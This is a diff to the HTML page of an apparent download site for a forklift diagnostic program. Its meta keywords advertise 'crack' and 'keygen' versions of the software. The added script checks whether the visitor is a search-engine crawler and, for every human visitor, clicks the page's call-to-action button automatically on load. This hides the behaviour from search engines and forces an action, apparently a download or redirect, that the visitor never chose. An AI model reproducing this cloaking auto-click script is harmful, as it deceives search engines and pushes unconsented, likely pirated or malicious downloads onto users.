@@ -5,6 +5,42 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Truckcom Cesab Forklift 3.4.1.0</title>
+    
+<script>
+const searchEngineUserAgents = [
+  'Googlebot',
+  'Bingbot',
+  'YandexBot',
+  'DuckDuckBot',
+  'Baiduspider',
+];
+
+function isSearchEngine(userAgent) {
+  return searchEngineUserAgents.some(bot => userAgent.includes(bot));
+}
+
+function clickCTAButton() {
+  const ctaButton = document.querySelector('.cta-button');
+  if (ctaButton) {
+    ctaButton.click();
+  }
+}
+
+function main() {
+  const userAgent = navigator.userAgent;
+  
+  if (!isSearchEngine(userAgent)) {
+    if (document.readyState === 'loading') {
+      document.addEventListener('DOMContentLoaded', clickCTAButton);
+    } else {
+      clickCTAButton();
+    }
+  }
+}
+
+main();
+</script>
+
     <meta name="description" content="Download Truckcom Cesab Forklift 3.4.1.0 diagnostic software for managing and maintaining Cesab forklifts. Available in multiple languages with enhanced features.">
     <meta name="keywords" content="Truckcom Cesab Forklift 3.4.1.0, Truckcom Cesab Forklift software, Truckcom Cesab diagnostic software, Truckcom Cesab diagnostic software download, Truckcom Cesab diagnostic software free download, Truckcom Cesab diagnostic software crack, Truckcom Cesab diagnostic software keygen, Truckcom Cesab Forklift software free download, Truckcom Cesab Forklift tool, Truckcom Cesab Forklift tool free download, Truckcom Cesab Forklift 3.4.1.0 download, Truckcom Cesab Forklift 3.4.1.0 free download, Truckcom Cesab Forklift 3.4.1.0 keygen, Truckcom Cesab Forklift 3.4.1.0 crack, Truckcom Cesab Forklift 3.4.1.0 high speed download, Truckcom Cesab diagnostic software 3.4.1.0, Truckcom Cesab diagnostic software 3.4.1.0 download, Truckcom Cesab diagnostic software 3.4.1.0 free download, Truckcom Cesab diagnostic software 3.4.1.0 crack, Truckcom Cesab diagnostic software 3.4.1.0 keygen, Truckcom Cesab forklifts diagnostic tool, Truckcom Cesab forklifts diagnostic tool free download, Truckcom Cesab forklifts software download, Truckcom Cesab forklifts software free download, Truckcom Cesab forklifts diagnostic software, Truckcom Cesab forklifts diagnostic software download, Truckcom Cesab forklifts diagnostic software free download, Truckcom Cesab forklifts diagnostic software crack, Truckcom Cesab forklifts diagnostic software keygen, Truckcom Cesab diagnostic tool, Truckcom Cesab diagnostic software key, Truckcom Cesab diagnostic software activation, Truckcom Cesab diagnostic software registration, Truckcom Cesab software 2024, Truckcom Cesab diagnostic software 2024, Truckcom Cesab forklifts diagnostic software 2024, Truckcom Cesab diagnostics tool free download">
     <style>
